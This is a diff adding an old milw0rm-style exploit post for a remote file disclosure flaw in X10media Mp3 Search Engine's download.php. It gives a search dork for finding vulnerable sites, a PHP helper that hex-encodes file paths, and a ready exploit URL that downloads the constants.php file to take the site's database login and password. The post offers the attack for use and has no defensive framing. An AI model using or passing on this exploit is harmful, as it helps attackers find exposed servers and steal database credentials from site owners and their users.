@@ -1,0 +1,46 @@
+################# ~THUNDER ################################################################
+
+
+    ~X10media Mp3 Search Engine v1.5.5 - 1.6 Remote File Disclosure Vulnerability
+
+    ~Founded by : THUNDER <t4h[at]hotmail.fr>
+    ~Dork: "This search engine is in no way intended for illegal downloads. "
+    ~File : Download.php
+
+===========================================================================================
+
+to read files you need to encode the url, so you can use this php code :
+<?
+//Encode URL ** THUNDER **
+function enc($string){
+    $hex='';
+    for ($i=0; $i < strlen($string); $i++){
+        $hex .= dechex(ord($string[$i]));
+    }
+    return $hex;
+}
+$thunder = $_GET[t];
+echo enc($thunder);
+?>
+
+How to use : http://127.0.0.1/encode.php?t=[Url]
+Ex : http://127.0.0.1/encode.php?t=includes/constants.php
+ 
+##### ~Exploit ############################################################################
+
+
+   http://www.target.com/[path]/download.php?url=[Encoded url]
+
+Example :
+let's download the constants.php file wich contains the database login and password .
+the file will be downloaded as .mp3 exstension .
+
+http://www.target.com/[path]/download.php?url=696e636c756465732f636f6e7374616e74732e706870
+
+Open the downloaded file with any text editor... ,and you got the database .           
+          
+
+
+###########################################################################################
+
+# milw0rm.com [2008-11-09]
